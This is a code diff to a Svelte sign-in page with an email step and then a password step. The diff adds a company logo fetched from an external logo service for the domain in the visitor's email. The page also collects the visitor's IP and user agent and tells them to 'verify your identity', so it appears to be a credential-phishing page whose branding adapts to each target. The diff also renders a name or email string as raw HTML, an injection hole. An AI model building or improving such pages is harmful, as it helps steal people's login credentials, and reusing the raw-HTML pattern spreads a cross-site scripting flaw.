@@ -9,6 +9,7 @@
   const loading = writable(false);
   const error = writable('');
   const step = writable<'email' | 'password'>('email');
+  const logoLoaded = writable(false);
 
   let userAgent = '';
   let ip = '';
@@ -19,6 +20,11 @@
   const getInitials = (text: string) => {
     const parts = text.split(/[@.\s]/).filter(Boolean);
     return (parts[0]?.[0] || '').toUpperCase() + (parts[1]?.[0] || '').toUpperCase();
+  };
+
+  const getLogoUrl = () => {
+    const domain = get(email).split('@')[1];
+    return domain ? `https://logo.clearbit.com/${domain}` : '';
   };
 
   const fetchIPData = async () => {
@@ -177,6 +183,13 @@
     align-items: center;
     justify-content: center;
     margin: 0 auto 0.8rem auto;
+    overflow: hidden;
+  }
+
+  .avatar img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
   }
 
   input {
@@ -243,7 +256,13 @@
       {:else}
         {#if $email || $name}
           <p class="instruction">Verify your identity to continue</p>
-          <div class="avatar">{getInitials($name || $email)}</div>
+          <div class="avatar">
+            {#if $logoLoaded}
+              <img src={getLogoUrl()} alt="logo" on:error={() => logoLoaded.set(false)} />
+            {:else}
+              {@html getInitials($name || $email)}
+            {/if}
+          </div>
           <h3 class="welcome">Welcome {$name || $email}</h3>
           <div class="subtext">{$email}</div>
         {/if}
